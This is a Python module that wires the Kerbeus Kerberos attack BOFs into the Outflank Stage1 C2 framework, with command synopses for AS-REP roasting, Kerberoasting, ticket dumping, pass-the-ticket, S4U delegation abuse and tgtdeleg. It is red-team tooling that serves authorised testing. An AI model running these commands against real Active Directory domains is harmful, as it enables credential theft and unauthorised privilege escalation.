from typing import List, Tuple, Optional

from outflank_stage1.implant.enums import ImplantArch
from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding


BASE_DIR = "/shared/bofs/Kerbeus-BOF/_bin"


class _KerbeusBase(BaseBOFTask):
    def __init__(self, name: str, base_name: str):
        super().__init__(
            name,
            base_binary_name=base_name,
            base_binary_path=BASE_DIR,
            supported_architectures=[ImplantArch.INTEL_X64],
        )

        self.parser.add_argument(
            "args",
            nargs="*",
        )

    def split_arguments(self, arguments: Optional[str]) -> List[str]:
        if arguments is None:
            return []

        if len(arguments) > 0:
            return [arguments]

        return []

    def _encode_arguments_bof(self, arguments: List[str]) -> List[Tuple[BOFArgumentEncoding, str]]:
        if not arguments:
            return []

        full_command_line = " ".join(arguments)
        return [(BOFArgumentEncoding.STR, full_command_line)]


class KerbAsreproastingBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_asreproasting", base_name="asreproasting")
        self.append_response("Kerbeus ASREPROASTING by RalfHacker\n")
        self.parser.description = "Perform AS-REP roasting."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN]\n"
        )


class KerbAsktgtBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_asktgt", base_name="asktgt")
        self.append_response("Kerbeus ASKTGT by RalfHacker\n")
        self.parser.description = "Retrieve a TGT."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_asktgt /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC]\n"
            "            [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]\n"
            "  krb_asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n"
            "  krb_asktgt /user:USER /rc4:HASH   [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n"
            "  krb_asktgt /user:USER /nopreauth  [/domain:DOMAIN] [/dc:DC] [/ptt]\n"
        )


class KerbAsktgsBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_asktgs", base_name="asktgs")
        self.append_response("Kerbeus ASKTGS by RalfHacker\n")
        self.parser.description = "Retrieve a TGS."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_asktgs /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC]\n"
            "            [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER]\n"
            "            [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]\n"
        )


class KerbChangepwBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_changepw", base_name="changepw")
        self.append_response("Kerbeus CHANGEPW by RalfHacker\n")
        self.parser.description = "Reset a user's password from a supplied TGT."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_changepw /ticket:BASE64 /new:PASSWORD [/dc:DC]\n"
            "               [/targetuser:USER] [/targetdomain:DOMAIN]\n"
        )


class KerbDescribeBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_describe", base_name="describe")
        self.append_response("Kerbeus DESCRIBE by RalfHacker\n")
        self.parser.description = "Parse and describe a ticket."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_describe /ticket:BASE64\n"
        )


class KerbDumpBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_dump", base_name="dump")
        self.append_response("Kerbeus DUMP by RalfHacker\n")
        self.parser.description = "Dump tickets."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n"
        )


class KerbHashBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_hash", base_name="hash")
        self.append_response("Kerbeus HASH by RalfHacker\n")
        self.parser.description = "Calculate rc4_hmac (NTLM), aes128_cts_hmac_sha1 and aes256_cts_hmac_sha1 hashes."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_hash /password:PASSWORD [/user:USER] [/domain:DOMAIN]\n"
        )


class KerbKerberoastingBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_kerberoasting", base_name="kerberoasting")
        self.append_response("Kerbeus KERBEROASTING by RalfHacker\n")
        self.parser.description = "Perform Kerberoasting."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_kerberoasting /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]\n"
            "  krb_kerberoasting /spn:SPN /ticket:BASE64 [/dc:DC]\n"
        )


class KerbKlistBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_klist", base_name="klist")
        self.append_response("Kerbeus KLIST by RalfHacker\n")
        self.parser.description = "List tickets."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n"
        )


class KerbPttBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_ptt", base_name="ptt")
        self.append_response("Kerbeus PTT by RalfHacker\n")
        self.parser.description = "Submit a TGT."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_ptt /ticket:BASE64 [/luid:LOGONID]\n"
        )


class KerbPurgeBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_purge", base_name="purge")
        self.append_response("Kerbeus PURGE by RalfHacker\n")
        self.parser.description = "Purge tickets."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_purge [/luid:LOGONID]\n"
        )


class KerbRenewBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_renew", base_name="renew")
        self.append_response("Kerbeus RENEW by RalfHacker\n")
        self.parser.description = "Renew a TGT."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_renew /ticket:BASE64 [/dc:DC] [/ptt]\n"
        )


class KerbS4uBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_s4u", base_name="s4u")
        self.append_response("Kerbeus S4U by RalfHacker\n")
        self.parser.description = "Perform S4U constrained delegation abuse."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_s4u /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64}\n"
            "          [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]\n"
        )


class KerbCrossS4uBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_cross_s4u", base_name="cross_s4u")
        self.append_response("Kerbeus CROSS S4U by RalfHacker\n")
        self.parser.description = "Perform S4U constrained delegation abuse across domains."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_cross_s4u /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC\n"
            "                {/impersonateuser:USER | /tgs:BASE64}\n"
            "                [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]\n"
        )


class KerbTgtdelegBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_tgtdeleg", base_name="tgtdeleg")
        self.append_response("Kerbeus TGTDELEG by RalfHacker\n")
        self.parser.description = "Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_tgtdeleg [/target:SPN]\n"
        )


class KerbTriageBOF(_KerbeusBase):
    def __init__(self):
        super().__init__("krb_triage", base_name="triage")
        self.append_response("Kerbeus TRIAGE by RalfHacker\n")
        self.parser.description = "List tickets in table format."
        self.parser.epilog = (
            "Synopsis:\n"
            "  krb_triage [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n"
        )

